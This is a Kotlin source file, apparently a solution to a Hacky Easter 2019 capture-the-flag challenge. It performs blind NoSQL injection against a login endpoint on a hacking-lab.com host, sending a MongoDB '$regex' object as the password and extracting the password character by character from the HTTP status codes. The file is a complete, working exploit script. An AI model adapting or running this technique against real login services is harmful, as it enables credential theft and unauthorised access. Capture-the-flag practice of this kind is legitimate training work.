package cz.vernjan.ctf.he19.ch10

import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpRequest.BodyPublishers
import java.net.http.HttpResponse.BodyHandlers
import java.time.Duration

private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '_'

fun main() {
    val username = "null"

    val passwordTemplate = """{"${'$'}regex": "^[X].*${'$'}"}"""
    val passwordChars = mutableListOf<Char>()

    for (i in (0..32)) {
        for (char in CHARS) {
            val partialPassword = passwordChars.joinToString(separator = "") + char
            val guess = PasswordCrackerClient.login(username, passwordTemplate.replace("[X]", partialPassword))

            if (guess) {
                passwordChars.add(char)
                if (PasswordCrackerClient.login(username, "\"$partialPassword\"")) {
                    println("The password is $partialPassword")
                    System.exit(0)
                } else {
                    println("Partial password is $partialPassword")
                }
                break
            }
            Thread.sleep(25)
        }
    }
}

object PasswordCrackerClient {

    private val httpClient = HttpClient.newBuilder()
        .version(HttpClient.Version.HTTP_1_1)
        .build()

    fun login(username: String, password: String): Boolean {
        val body = """ {"username": "$username", "password": $password } """
        val request = HttpRequest.newBuilder()
            .POST(BodyPublishers.ofString(body))
            .header("Content-Type", "application/json")
            .uri(URI.create("http://whale.hacking-lab.com:3371/login"))
            .timeout(Duration.ofSeconds(10))
            .build()

        val response = httpClient.send(request, BodyHandlers.ofString())
        println("Testing $password: ${response.statusCode()}")

        return response.statusCode() == 302
    }
}